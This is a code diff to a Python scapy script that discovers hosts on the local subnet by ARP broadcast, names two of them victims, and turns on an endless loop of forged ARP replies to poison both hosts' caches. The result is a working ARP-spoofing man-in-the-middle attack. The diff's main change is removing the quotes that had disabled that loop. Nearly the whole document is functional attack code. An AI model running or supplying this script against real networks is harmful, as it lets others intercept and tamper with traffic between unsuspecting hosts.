@@ -1,10 +1,9 @@
 from scapy.all import *
 from scapy.all import IP, Ether, ARP, ICMP
 
+# to obtain the network adress
 network_addr = get_if_addr(conf.iface).split('.')
-print(network_addr)
-network_addr = network_addr[0] + "." + network_addr[1] + "." + network_addr[2]
-print(network_addr)
+network_addr = network_addr[0] + "." + network_addr[1] + "." + network_addr[2] + ".0/24"
 
 frame = Ether(dst="ff:ff:ff:ff:ff:ff")
 
@@ -16,8 +15,8 @@ MAC_on_network = []
 IP_on_network = []
 
 for i in range(len(IP_MAC_responses)):
-    MAC_on_network.append(IP_MAC_responses[i][1].hwsrc) #to extract MAC
-    IP_on_network.append(IP_MAC_responses[i][1].psrc) #to extract IP
+    MAC_on_network.append(IP_MAC_responses[i][1].hwsrc) # to extract MAC from devices on network
+    IP_on_network.append(IP_MAC_responses[i][1].psrc) # to extract IP from devices on network
 
 victim1_IP = IP_on_network[1]
 victim1_MAC = MAC_on_network[1]
@@ -26,10 +25,9 @@ victim2_IP = IP_on_network[2]
 victim2_MAC = MAC_on_network[2]
 
 atk_mac = get_if_hwaddr(conf.iface)
-'''
+
 while True:
     spoof_arp_victim2 = Ether(src=atk_mac)/ARP(op=2, pdst=victim2_IP, hwdst=victim2_MAC, psrc=victim1_IP)
     send_spoof2 = sendp(spoof_arp_victim2)
     spoof_arp_victim1 = Ether(src=atk_mac)/ARP(op=2, pdst=victim1_IP, hwdst=victim1_MAC, psrc=victim2_IP)
     send_spoof1 = sendp(spoof_arp_victim1)
-    '''
